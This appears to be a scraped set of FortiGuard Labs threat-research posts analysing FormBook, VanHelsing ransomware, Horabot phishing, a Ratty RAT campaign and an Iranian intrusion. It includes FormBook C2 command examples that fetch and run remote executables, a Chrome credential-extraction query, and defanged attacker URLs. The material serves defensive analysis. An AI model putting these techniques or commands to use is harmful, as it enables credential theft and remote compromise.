the NtUserGetMessage() API) until a new message arrives. If FormBook modifies the value of the RIP register to point to the copied FormBook payload and then proactively sends a message to the process, it can then hijack the original execution flow and redirect it to run the FormBook payload instead. The FormBook instance in PATHPING.EXE also acts as a daemon, monitoring the socket process. Once the victim terminates the socket process, FormBook immediately selects another child process of explorer.exe to take its place. The FormBook instance running in PATHPING.EXE harvests sensitive data from the compromised system, such as saved credentials of various software, autofill data, cookies, proxy settings for browsers, and data from the system clipboard. FormBook can also obtain sensitive data from multiple resources, such as the system registry and the local profile files. For example, it extracts the autofill data for the IE browser from the key path “HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” in the system registry. It also collects email account information from Outlook by scanning the following key paths in the system registry to cover multiple Outlook versions: When gathering sensitive data from Chrome, FormBook accesses some SQLite database format files located in “%LocalData%\\Google\\Chrome\\User Data\\Login Data\\Default\\”, explicitly targeting these files: “Login Data” (credentials), “Cookies” (web site cookies), “Web Data” (autofill), and “Network” (proxy setting). This is accomplished through a series of winsqlite3.dll API calls, including sqlite3_open(), sqlite3_prepare_v2(), sqlite3_step(), sqlite3_column_text(), sqlite3_column_blob(), sqlite3_column_bytes(), and sqlite3_close(). Figure 17 demonstrates Chrome credential extraction, showing FormBook executing the SQL query “SELECT origin_url, username_value, password_value FROM logins” via the sqlite3_prepare_v2() API. The sample credentials, shown at the bottom, were just obtained from a Chrome browser in a test environment. The malware maintains the capability to collect similar sensitive data from a wide range of additional applications. Below are the categorized software applications from which FormBook can collect sensitive data: Email Clients: Outlook, Thunderbird, and Foxmail. Web Browsers: Internet Explorer, Chrome, Firefox, Edge, Brave-Browser, Opera Neon, ChromePlus, Avast Secure Browser, Yandex Browser, Citrio, Sleipnir 5, Epic Privacy Browser, Elements Browser, 360 Chrome, CCleaner Browser, Sputnik, Cốc Cốc Browser, Opera, Uran, Coowon Browser, Comodo Dragon, AVG Secure Browser, CentBrowser, 7Star Browser, UR Browser, SalamWeb, QIP Surf, Chromium, Iridium Browser, Slimjet, Vivaldi, Orbitum, Liebao, Kometa Browser, Chedot, Torch Browser, Amigo, Kinza, and Blisk, Let’s now examine the socket process (another selected process, like notepad.exe) that handles communication with the Command-and-Control (C2) server in the background. The C2 domain list in this variant of FormBook is not stored in plaintext. Instead, it undergoes a multi-layered obfuscation process. Each domain is encrypted, encoded using Base64, and then encrypted again. This technique adds significant complexity to static analysis and helps evade detection. This variant has 64 C2 domains, which are dynamically retrieved in the socket process by referencing a one-byte index. The decrypted domains only exist temporarily in memory during runtime, making them more elusive. For the complete list of C2 domains, refer to the IOCs section at the end of this report. Figure 18 shows the socket process after successfully decrypting a C2 server domain from memory. The decrypted domain is “www[.]manicure-nano[.]sbs,” corresponding to index 0x2B, with the associated URL “/xkx8/”. A shared memory section is created between PATHPING.EXE and the socket process (like notepad.exe), which is used to share: Another responsibility of the socket process is to gather system clipboard data. FormBook performs this by running a thread calling the relevant APIs: OpenClipboard(), GetClipboardData(), GlobalLock(), GlobalUnlock(), and CloseClipboard(). The collected clipboard data is also stored in shared memory. Within the socket process, FormBook starts a specific thread to repeatedly check if a flag is set by PATHPING.EXE that tells if the collected data is ready to send. Once the flag is triggered, FormBook transmits the collected data using HTTP GET and POST. Based on my analysis, basic system information is sent via GET, and other data is sent via POST. As shown in Figure 19, execution breaks at a function call (located at 0x1F08625B1D1) that is responsible for encrypting collected credentials—retrieved from Mozilla Firefox in this instance—in the memory dump before sending them to the C2 server. To evade detection during transmission, FormBook encrypts and encodes the data before sending it out. Each C2 server has its own unique 0x14-byte-long encryption key seed hardcoded in memory. The data undergoes two layers of encryption. It first uses a common predefined key to encrypt the data, then uses the C2 server’s own encryption key to encrypt it again. After this double encryption, FormBook encodes the data using the standard base64 algorithm. Figure 20 shows a screenshot of an HTTP Post packet in Wireshark, illustrating how FormBook sends collected data to a C2 server. The URL in this case is www[.]grcgrg[.]net/jxyu/. The encrypted data is located in the body portion of the POST request, prefixed with a randomly generated string, “30J0cVz=”. As mentioned before, when the socket process receives a command packet from the C2 server, it saves it in shared memory and sets a corresponding flag. This informs the FormBook instance running in the PATHPING.EXE to process the C2 command. All incoming packets from the C2 server are multi-layer encrypted and Base64-encoded. Once received, the PATHPING.EXE instance decrypts and decodes the packets before interpretation. A decrypted packet format looks like this: “XLNG{command ID}{command data}{XLNG}” FormBook Control Commands: 1.     ‘1’ – 0x31: This command delivers three kinds of executable files within the packet: *.dll, *.ps1, and *.exe. Once this command is received, FormBook saves the file into the system %temp% directory and then executes it on the victim’s system. 2.     ‘2’ – 0x32: This command can be used to update the FormBook or execute other malware. FormBook receives a 32-bit EXE file in the packet and saves it into a randomly generated temp file within the system. After that, it executes the EXE file by invoking the CreateProcessInternalW() API. As shown in Figure 21, it just wrote the 32-bit EXE data into a temp file, such as “%temp%\\yzbtfb3.exe.” It finally calls ExitProcess() to exit the current FormBook process (PATHPING.EXE). 3.     ‘3’ – 0x33: This command is used to remove FormBook from the victim’s system. It deletes Formbook's file and Auto-run items from the system registry and exits the current FormBook instance. It also restarts the Explorer.exe process. 4.     ‘4’ – 0x34: When FormBook receives this command, it downloads an executable file from a given URL that comes with the packet if a subcommand is provided. Otherwise, it only executes a given command. This variant of FormBook provides two sub-commands: Below are three cases that demonstrate how the ‘4’ command works. Without sub-command: XLNG4cmd.exeXLNG RMTD sub-command: XLNG4RMTD:http://test.com/test.exeXLNG RMTU sub-command: XLNG4RMTU:http://test.com/test.ps1XLNG FormBook downloads the file into a randomly named file under the system’s %temp% folder. It calls a series of APIs to do so, such as InternetOpenW(), InternetConnectW(), HttpOpenRequestW(), HttpSendRequestW(), InternetQueryDataAvailable(), and InternetReadFile(). Finally, FormBook calls ShellExecuteA to execute the downloaded file in the compromised system. If no sub-commend is provided in the command data, it means the command data is not a URL, which can be executed directly by calling the ShellExecuteA() API. Figure 22 provides an example with a simulated control command packet, which was about to call an API to launch “C:\\Windows\\system32\\mspaint.exe”. 5.     ‘5’ – 0x35: This command allows FormBook to clean sensitive data saved on the victim's browsers, such as cookies, credentials, and more. It also deletes some folders and files from the compromised system by calling the SHFileOperationW() API. The affected paths are: • \"%WinDir%\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\\Low\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\\Low\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Cookies\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Current Session\"• \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\{ProfileName}\\Cookies.sqlite\" 6.     ‘6’ – 0x36: This command instructs FormBook to collect sensitive data that will be sent to the C2 server, as explained in the “Collect Sensitive Data” section above. 7.     ‘7’ – 0x37: Reboots the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_REBOOT parameter to reboot the system. 8.     ‘8’ – 0x38: Powers off the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_POWEROFF parameter to power off the system. 9.     ‘9’ – 0x39: In this variant, the command corresponds to an empty function. In this second part of the FormBook blog series, I explained how the FormBook payload operates within the 32-bit target process, “ImagingDevices.exe.” Figure 23 provides an overview of the entire workflow executed by the payload. I also showed the various complicated anti-analysis techniques used by this FormBook variant, including—but not limited to—a hidden ntdll.dll module, API obfuscation, more than 100 encrypted key functions, anti-sandbox techniques, anti-debugging, and the repeated use of Heaven’s Gate techniques. I then explained how FormBook randomly selects a process from active processes and takes control of it using the Heaven’s Gate technique. Its main objective is to perform process hollowing on the selected process (say PATHPING.EXE), inject FormBook into the process, and execute it as a dashboard. Once running, FormBook collects a wide range of sensitive data from the victim’s system, including, but not limited to, basic system information, saved credentials, cookie data, autofill data, browser history, and more. Next, I described how the C2 server list in this FormBook variant is decrypted and decoded, and how stolen sensitive data is formatted and transmitted in network packets. Finally, I examined FormBook’s nine control commands, which enable a wide array of capabilities, such as executing provided executable files, launching an existing file, downloading and executing EXE, DLL, and PS1 files, and remotely rebooting or shutting down the victim’s machine. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for accessing FormBook’s C2 server. The C2 server list is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the VanHelsing ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands a ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the VanHelsing ransomware was made available on a publicly available file-scanning site in mid-March 2025. Like other ransomware attacks, VanHelsing demands a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the VanHelsing ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the VanHelsing ransomware (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) takes the following command line arguments: The VanHelsing ransomware then encrypts files on the compromised machines and adds the file extension “.vanlocker” to affected files. Note that although this VanHelsing variant (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) uses “.vanlocker” as its extension, it still belongs to the VanHelsing ransomware family because it uses the same ransom negotiation and data leak sites as another VanHelsing variant. (SHA2: 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17) This other variant adds a “.vanhelsing” file extension to the files it encrypts. The VanHelsing ransomware exempts the following files: boot.ini autofun.inf bootfont.bin bootsect.bak desktop.ini ntldr ntuser.dat ntuser.dat.log ntuser.ini thumb.db GDIPFONTCACHEV1.DAT iconcache.db d3d9caps.dat LOGS.txt README.txt It also avoids encrypting files with the following file extensions: .vanlocker .exe .dll .lnk .sys .msi .bat .bin .com .cmd .386 .adv .ani .cab .ico .mod .msstyles .msu .nomedia .ps1 .rtp .syss .deskthemepack .cur .cpl .diagcab .diagcfg .diagpke .dll .drv .hlp .pdb .hta .key .lock .ldf .ocx .icl .icns .ics .idx .mod .mpa .msc .msp .nls .rom .scr .shs .spl .theme .thempa .wpx The VanHelsing ransomware avoids encrypting files in the following folders: tmp wiint temp thumb $Recycle.Bin $RECYCLE.BIN System Volume Information boot Windows Trend Micro program files program files(x86) tor browser Windows intel all users msocache perflogs default microsoft It also creates the following mutex: It may also modify the registry key Software\\Classes\\.vanlocker\\DefaultIcon to use a custom icon for .VANLOCKER files. However, we did not observe this VanHelsing ransomware sample change the file icon of the encrypted files in our testing. It then drops the following ransom note in “README.txt”: The ransom note directs victims to chat sites operated by the attacker on TOR, where ransom negotiation takes place. The ransomware also replaces the desktop wallpaper with its own. The VanHelsing ransomware operates a TOR site where the group posts the information it has stolen from its victims. At the time of our initial investigation in late March 2025, six victims were on the data leak site, and they had added one more victim when we checked back in mid-April. Our analysis of the VanHelsing ransomware victims listed on the data leak site found: Note that victims who have paid the ransom may have been removed from the data leak site. As such, additional companies may have been affected by the VanHelsing ransomware. The VanHelsing ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High In April, FortiGuard Labs observed a threat actor using phishing emails with malicious HTML files to spread Horabot, malware that primarily targets Spanish-speaking users. It is known for using crafted emails that impersonate invoices or financial documents to trick victims into opening malicious attachments and can steal email credentials, harvest contact lists, and install banking trojans. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Horabot leverages Outlook COM automation to send phishing messages from the victim’s mailbox, enabling it to propagate laterally within corporate or personal networks. The threat actor also executed a combination of VBScript, AutoIt, and PowerShell to conduct system reconnaissance, credential theft, and the installation of additional payloads. Based on the telemetry gathered by FortiGuard Labs, these attacks target users in Latin America, including Mexico, Guatemala, Colombia, Peru, Chile, and Argentina. To trick the recipient into opening the email and attachment, it is written in Spanish from a “legitimate” sender in Mexico, and its subject line references an attached invoice (Factura Adjunta). The message claims to include a PDF invoice for acquired services or products and urges the user to open the attachment. However, the attached ZIP file contains a malicious HTML file with Base64 encoded data in the “iframe” tag. This decoded data is also HTML data with a remote URL “hxxps://t4[.]contactswebaccion[.]store/0704/” used to download the next payload. The URL leads to a web page with JavaScript that immediately attempts to download the hard-coded ZIP file “ADJUNTOS_23042025.zip.” The file “ADJUNTOS_23042025.zip” contains an HTA file with a large number of unused strings in the <body>. The <script> tag uses “moveTo(7426, 6245),” a browser redirection trick that repositions the window. It then loads a script from “hxxps://d1[.]webcorreio[.]pics/LNIJGPNIPPK/WWGDI.” The script on the remote server injects an external VBScript hosted at “hxxps://dl[.]webcorreio[.]pics/g1/.” This VBScript is appended into the HTML <head> element, enabling stealthy execution within the user's browser context. The script serves to check the victim’s environment and deliver additional payloads. The VBScript at “hxxps://dl[.]webcorreio[.]pics/g1/” implements a custom string-decoded routine by processing every two characters, performing mathematical transformations, and reconstructing hidden strings, such as URLs, PowerShell commands, or other instructions. This method helps the malware evade static detection by keeping its real behavior hidden until execution. The following are the main tasks in this script, along with a screenshot of the decoded string: 1. Environment Detection and Evasion 2. Folder Preparation:It checks the working directory and if “C:\\Users\\Public\\LAPTOP-0QF0NEUP” does not exist, it creates it. Otherwise, it quits the script to avoid potential re-infection. 3. Collection and Exfiltration:This process collects the victim's basic information by grabbing the local IP address, computer name, username, and Windows version. It then sends the collected data via HTTP POST to “hxxps://d1[.]webcorreio[.]pics/g1/ctld/salvar.php.” 4. Preparation for AutoIt 5. Preparation for PowerShell:Creates a Batch script (.bat) to decode a text file (.tws) for executing a PowerShell script from “hxxps://labodeguitaup[.]space/a/08/150822/au/au.” This script is responsible for spreading phishing mail. 6. Persistence:First, it deletes all .lnk, .cmd, .bat, .exe, .vbs, and .tws files in the %Startup% and %AppData% folders. It then creates a new shortcut .lnk file pointing to the hidden dropped files related to the AutoIt payload (winupdate_version_686.exe with .ai arguments). It also sets the .lnk file to execute the Batch script during system startup for the PowerShell script. 7. Execution and Cleanup:It executes the created shortcuts via PowerShell commands using ExecutionPolicy Bypass to avoid script execution restrictions and kills mshta.exe. In the following sections, we’ll elaborate on the activities delivered by the encrypted data and the remote PowerShell. The AutoIt script “winupdate_version_067.ai” is for decryption. It finds the “.ia” file in the same directory, decrypts it with the hard-coded key “99521487,” injects the decrypted malicious DLL, and executes the entry point at “B080723_N.” The DLL begins by collecting system information from the victim’s machine, including the current date and time, operating system version, username, hostname, and installed antivirus software. It then sends this data via a POST request to the C2 server “hxxp://209[.]74[.]71[.]168/on7all/index15.php.” The exfiltrated data is organized into two parameters: AT, which carries information such as timestamp, OS type, and user identity, and MD, which specifically identifies the presence and name of antivirus software. This structured telemetry allows the attacker to profile infected systems. The malware then proceeds to steal browser-related data from a range of targeted web browsers, including Brave, Yandex, Epic Privacy Browser, Comodo Dragon, Cent Browser, Opera, Microsoft Edge, and Google Chrome. Once the data is collected, it is exfiltrated to the remote server at “hxxp://93[.]127[.]200[.]211/a/08/150822/au/logs/index.php?CHLG.” In addition to data theft, Horabot monitors the victim’s behavior and injects fake pop-up windows designed to capture sensitive user login credentials. These overlay windows are embedded within the RCData section of the decrypted malicious DLL, enabling stealthy deployment and execution without relying on external visual components. The target script on “hxxps://labodeguitaup[.]space/a/08/150822/au/au” in the previous VBScript intends to execute another six scripts at the remote server “hxxp://93[.]127[.]200[.]211/a/08/150822/au”: “app,” “a2,” “a3,” “a4,” “a5,” and “a6.” For unknown reasons, the “a5” file is empty, but the rest of the files can achieve a full cycle of building a victim list, email automation, and efficient Horabot payload delivery. The “app” acts as an infection check, checking whether a marker file (C:\\Users\\Public\\d240425) exists and exiting if it does. It then forcefully terminates any running instance of Outlook (Outlook.exe) to ensure it can launch Outlook cleanly using a COM object. Then, after creating an Outlook.Application object and accessing its MAPI namespace, it initializes an empty list to collect email addresses and defines a blocked domain list—“gmail,” “hotmail,” “outlook,” “edu,” “con.mx,” and “facebook”—which avoids collecting personal, academic, and Facebook-related emails. The “a2” script contains two functions to build a list of email addresses. The first function is designed to scan the contact data within Outlook’s AddressLists. For each contact, it checks the AddressEntryUserType to determine whether the email address can be directly retrieved or must be resolved via GetExchangeUser() to extract the primary SMTP address. The second function recursively traverses all folders in the Outlook mailbox structure, extracting and filtering email addresses from both recipients and senders of each message using the same logic. The “a3” script saves collected addresses in the “APPDATA\\Microsoft\\.Outlook” to reduce visibility and transmits the email list to an external server, “labodeguitaup[.]space.” It then fetches a payload from another server, “93[.]127[.]200[.]211,” and converts the response content to Base64 for later use. This routine indicates the malware is not only gathering target data but also preparing for future interactions or customized delivery stages. The “a4” script constructs and delivers malicious emails disguised as legitimate invoices. It saves the payload from server “93[.]127[.]200[.]211” with a “.PDF.html” filename and compresses it into a .zip archive that mimics a standard invoice attachment. It then prepares to send this archive as an attachment via Outlook. It references the extracted email address, excluding known domains like Gmail, Yahoo, Hotmail, .edu, Facebook, and .con.mx through the “Verificar-PalavrasBloqueadas” function (Check-BlockedWords). For each valid target, it creates an email item with a subject line referencing a “FWD Factura Adjunta” (FWD Invoice Attached), a Spanish-language body message about the attached invoice, and the malicious zip archive as an attachment. After the emails are sent, the script “a6” removes all traces and deletes related files, reducing the chances of being detected. Horabot is a growing threat demonstrating how phishing attacks are becoming more advanced, especially in Latin America. It spreads through fake Spanish-language emails pretending to be invoices, tricking people into opening harmful attachments. The malware uses VBScript, AutoIt, and PowerShell to hide itself, steal login credentials, and collect email contacts. It then uses Outlook to send itself to more victims, spreading through companies and personal networks. Because it is designed to blend in with normal Windows and Outlook behavior, it can be hard to notice. Organizations should block suspicious emails, watch for unknown file activity, and educate employees to be cautious with phishing scams.

    "link": "https://www.fortinet.com/blog/threat-research/multilayered-email-attack-how-a-pdf-invoice-and-geofencing-led-to-rat-malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows (primarily), Linux & macOS (if Java is installed)Impacted parties:Users on systems with Java Runtime Environment (JRE) installedImpact:Grants remote access to attackers, enabling them to execute commands, log keystrokes, access files, activate webcam/microphone, and fully control the infected systemSeverity level:High The FortiMail IR team recently uncovered a new email campaign distributing a Remote Access Trojan (RAT) using multiple evasion techniques to target organizations in Spain, Italy, and Portugal. The campaign leverages theserviciodecorreoemail service provider, which is configured as an authorized sender for various domains and successfully passes SPF validation. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Additionally, it employs advanced evasion strategies, including the abuse of two file-sharing platforms, geolocation filtering, and Ngrok to create secure, obfuscated tunnels. These tactics further complicate detection and effectively mask the attack's true origin, ultimately facilitating the distribution of RATty malware. This campaign highlights the increasing sophistication of malware attack methodologies, leveraging the legitimate functionalities of remote administration tools for malicious purposes. The attacker exploits serviciodecorreo.es, a legitimate Spanish email service authorized to send emails on behalf of various domains. Since the SPF record for these domains designates serviciodecorreo.es as a valid sender, the malicious emails successfully pass SPF checks, creating the illusion of legitimacy. Consequently, these emails are more likely to bypass security filters, making it easier for them to be accepted by the recipient's mail server. This increases the likelihood of a successful attack, as the deceptive nature of the emails goes unnoticed. The sender attaches a PDF file asking the recipient to review two new invoices. This makes the recipient believe this email is important, which may influence them to check the attached files and details. This is basic social engineering to tempt the recipient into acting with less caution and under pressure. The attached PDF file displays a message indicating that the file is not being shown correctly and instructs the recipient to click a button to download the file locally. The button contains a Dropbox (file-sharing platform) link to download an HTML file named \"Fattura\" (Translation: “Invoice”). The choice of this file name plays into the social engineering tactic, aiming to persuade the recipient to click and view the information, ultimately leading to the delivery of a malicious payload. The HTML file contains a basic validation step with an \"I am not a robot\" prompt. After completing the verification, a simple HTML page is displayed with instructions to click a button to view the document. The button redirects the user to a link generated by Ngrok, a tunneling tool that allows users to expose local servers to the internet through secure, temporary URLs. The following URL abuses the MediaFire file-sharing platform by automatically downloading the JAR file (FA-43-03-2025.jar) when accessed. hxxps://download1528[.]mediafire[.]com/35ougpab4uhgHgb3Pmqh8niQ0hzS9b-TtTro5oPV5iUIULfNckqgXvjXQ6aTp-NF-k8EflSnFWC--Ffh4aX1NlYrzaPzgFlyxHVe0fKkLE1p3u5cntfU25orm92QdoQmXE9-gyI4hRgSYpaNcd3o12kJnPRbJhD3aqbl1Qx3vqbUtk8/ayp0ikmndrdseht/FA-43-03-2025.jar Using a legitimate file-sharing service helps attackers further evade detection, as security filters are less likely to flag downloads from trusted platforms. This tactic makes detection and blocking more difficult for security companies since automated analysis systems, sandbox environments, and security researchers often inspect URLs from locations outside the targeted region. By selectively delivering the malware only to specific geolocations, attackers reduce the risk of early detection and increase the likelihood of a successful attack. Below, we can see how this evasion leads to a Google Drive link containing a legitimate file: Ngrok is primarily used to test webhooks, develop locally hosted applications, and bypass NAT/firewall restrictions. However, as in this case, threat actors can misuse Ngrok to create dynamic, hard-to-detect phishing links that evade traditional security filters. Attackers use Ngrok to dynamically generate URLs that help them evade email security filtering mechanisms. One key technique they employ is geo-based cloaking, which serves different content depending on the user's location. In this case, when users access the Ngrok-generated URL from any country except Italy, they are redirected to a seemingly legitimate Google Drive document, making it harder for email security solutions to classify the URL as malicious. The attached fake invoice is identical for all targeted organizations. It is a purported invoice from the global health organization Medinova Health Group, and it has been designed to bypass most email security mechanisms. The seemingly legitimate invoice, shared via Google Drive, is unlikely to raise suspicion during email scanning and is intended to slip past email security engines without triggering any suspicion of malicious intent. However, when the request originates from Italy, the URL changes entirely, leading to downloading a malicious JAR file. Most email security systems perform email analysis from generic or cloud-based environments, not tied to a specific geographic location. As a result, when these systems access the embedded URL, they are redirected to a harmless decoy page rather than the malicious file. This geofencing technique ensures that only users in the targeted regions -in this case, Italy - can reach the actual malicious content. The .jar file contains a type ofRattymalware.  The file name, \"FA-43-03-2025.jar,\" resembles a neutral reference number. While such naming conventions are not unusual, this name was probably specifically chosen to prompt the end user to click and execute the file, assuming it is related to a payment document, thus encouraging hasty and careless action. Ratty RAT is a Java-based Remote Access Trojan (RAT) typically distributed as a .jar file. Since Java is a cross-platform language, Ratty RAT can run on various operating systems as long as the Java Runtime Environment (JRE) is installed. Threat actors use Ratty RAT to execute remote commands, log keystrokes, capture screenshots, and steal sensitive data, often as part of email-based social engineering campaigns with malicious attachments. While it is commonly delivered as a .jar file, attackers may also package it as an MSI (Microsoft Installer) file to increase its legitimacy and evade detection. By bundling the RAT inside an MSI, they can disguise it as legitimate software or an update, making it easier to trick users into executing the malware. What makes this email campaign particularly sophisticated is its combination of multiple tactics designed to evade detection and exploit trusted platforms. Its multi-layered strategy uses social engineering techniques to manipulate recipients into clicking on malicious links. The initial email, disguised as an invoice and sent from a sender who appears legitimate, serves as the entry point. The attacker clearly conducted prior research, identifying which domains allow the use of the specific email service for sending emails, thereby bypassing some critical security measures. The attackers also abuse file-sharing platforms like Dropbox and MediaFire to deliver their malicious payload while leveraging geolocation techniques to tailor the attack based on the recipient's location. Additionally, the use of Ngrok complicates detection by creating secure, obfuscated tunnels that mask the true origin of the attack. Together, these elements create a highly advanced and effective method of distributing malware, including RATty (Remote Access Trojan), which is challenging for traditional security systems to detect and block. Fortinet provides multiple layers of protection against this threat. FortiGate and FortiClient detect and block the malicious JAR file using the latest antivirus (AV) signatures. Customers are advised to ensure their systems are regularly updated with the most recent AV database.Fortinet customers are also already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services. FortiMail recognizes the phishing email as “virus detected,” and the FortiMail Content Disarm and Reconstruction (CDR) function automatically detects and mitigates this threat. In addition, FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides real-time anti-phishing protection against known and unknown phishing attempts. Perception Point Email Security, now part of Fortinet FortiMail, also proactively detects and blocks emails containing malicious geo-fenced URLs used to deliver malware and phishing content and the RATty JAR file itself. This is achieved through advanced dynamic scanning and static analysis techniques.

    "content": "FortiGuard Labs Threat Research The FortiGuard Incident Response (FGIR) team recently investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East, attributed to an Iranian state-sponsored threat group. The attack involved extensive espionage operations and suspected network prepositioning—a tactic often used to maintain persistent access for future strategic advantage. Full Report Available:The following article provides key findings, but a full report of this activity is availablehere. The report includes an analysis of novel malware deployed throughout the intrusion, a detailed breakdown of adversary TTPs across different attack stages, Indicators of Compromise (IOCs) to assist defenders, and attribution considerations for deeper insight. The intrusion persisted from at least May 2023 to February 2025, with signs of compromise dating back as far as May 2021. Attackers initially gained access via stolen VPN credentials and established persistence through multiple web shells and backdoors, including Havoc, HanifNet, HXLibrary, and NeoExpressRAT. They bypassed network segmentation using open-source proxying tools like plink, Ngrok, glider proxy, and ReverseSocks5. Key insights from the investigation include: The attack unfolded in four distinct phases: 1. Establishing a Foothold and Initial Operations (May 2023 – April 2024)The adversary used stolen credentials to access the victim’s SSL VPN, deploying web shells on public-facing servers and installing Havoc, HanifNet, and HXLibrary backdoors. They then stole credentials and moved laterally using RDP and PsExec. 2. Consolidating the Foothold (April 2024 – November 2024)Additional persistence mechanisms were introduced, including NeoExpressRAT. The adversary chained proxies (plink, Ngrok) to bypass segmentation, exfiltrated targeted email data, and began interacting with virtualization infrastructure. 3. Initial Remediation and Adversary Response (November 2024 – December 2024)The victim implemented initial containment steps, prompting a surge in adversary activity. To maintain access, additional web shells, SystemBC, and MeshCentral were deployed, with a focus on targeting deeper CNI network segments. 4. Intrusion Containment and Final Adversary Response (December 2024 – Present)The victim successfully removed adversary access. In response, attackers attempted to re-enter via vulnerabilities in web applications and launched targeted phishing campaigns to steal credentials. Multiple failed access attempts were detected. The victim organization had a highly segmented network, including a restricted Operational Technology (OT) environment. While no confirmed disruption to OT systems was found, FGIR observed targeted reconnaissance and credential harvesting, indicating strong adversary interest in these systems. The attackers moved from IT to restricted segments by chaining proxy tools and implants to bypass segmentation. The attacker relied on VPS-hosted infrastructure, avoiding U.S.-based providers. Notable malware variants used include: State-sponsored cyber adversaries continue to target and compromise critical infrastructure networks, seeking to maintain persistent access. Organizations should prioritize the following defensive measures: This investigation highlights the persistent and evolving nature of state-backed cyber threats targeting Middle Eastern CNIs. The adversary demonstrated advanced tactics to deeply embed themselves, evade detection, and sustain long-term access. Despite containment efforts, the adversary has continued efforts to regain access, indicating a long-term strategic interest in this environment. Organizations must remain vigilant, continuously refining their detection and response strategies to defend against sophisticated, state-sponsored cyber campaigns.

    "link": "https://www.fortinet.com/blog/threat-research/key-takeaways-from-the-2025-global-threat-landscape-report",
    "content": "FortiGuard Labs Threat Research In 2024, the FortiGuard Labs team observed a decisive shift in the threat landscape: Attackers are compressing the time between reconnaissance and compromise, and the window for defenders to respond is narrowing to days, sometimes hours. The2025 Global Threat Landscape Reportdraws on telemetry from Fortinet’s global sensor network and threat intelligence from FortiGuard Labs to deliver a clear message: the adversary advantage is accelerating. And unless organizations change how they measure and manage risk, the gap will continue to widen. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Across every stage of the attack chain, automation is reshaping threat behavior. In the reconnaissance phase, cybercriminals launched over 36,000 scans per second in 2024, a 16.7% global increase. These scans are no longer just searching for exposed ports; they’re probing deep into operational technology (OT), cloud APIs, and identity layers. SIP-based VoIP systems, RDP servers, and industrial protocols like Modbus TCP are being mapped automatically and continuously. Automation also extends to phishing, credential theft, and even malware development. Cyber adversaries use AI-powered tools like FraudGPT and ElevenLabs to craft convincing phishing lures, generate deepfake videos, and clone executive voices. Cybercriminals no longer need to write code or breach a system directly; threat actors can purchase access, tools, and infrastructure through a rapidly growing Cybercrime-as-a-Service (CaaS) marketplace. The result is an industrialized cybercrime economy that dramatically lowers the barrier to entry, expands the volume of attacks, and increases their success rate. In 2024, FortiGuard Labs tracked a 42% surge in stolen credentials offered on darknet forums. That’s more than 100 billion unique records—email addresses, passwords, session tokens, and multifactor bypass data—freely traded and sold. Infostealer malware like Redline and Vidar contributed to a 500% increase in credential log activity, much of it harvested in real time and sold by Initial Access Brokers (IABs) offering turnkey infiltration into corporate VPNs, RDPs, and admin panels. These credentials are the backbone of ransomware and espionage operations. Threat actors no longer just hunt for vulnerabilities to exploit; they’re buying entry into your network. And as long as stolen credentials remain abundant, brute force is unnecessary. Cloud services now sit at the center of modern operations, and identity has become one of the most critical security perimeters. Cloud breaches are no longer limited to misconfigured storage buckets. As infrastructure migrates to the cloud, attackers are finding familiar footholds to exploit, such as over-permissioned identities, credential leaks in public code repositories, and lateral movement through cloud-native services. FortiCNAPP telemetry shows that attackers often begin by logging in from unfamiliar geographies, sometimes within hours of a developer’s legitimate activity. From there, they escalate privileges, establish persistence, and use legitimate services to blend into normal network traffic. In 2024, 25% of all cloud incidents began with reconnaissance, such as API enumeration, permission probing, and discovery of exposed assets. Automation is also fueling scale. Fortinet’s intrusion prevention sensors recorded over 97 billion exploitation attempts in the second half of 2024, many targeting vulnerabilities disclosed years ago. CVE-2017-0147 (26.7% of all exploitation attempts), CVE-2021-44228 (11.6%), and CVE-2019-18935 (8%) remain among the most exploited—clear evidence that legacy exposures continue to create present-day risk. IoT devices were also a major target, 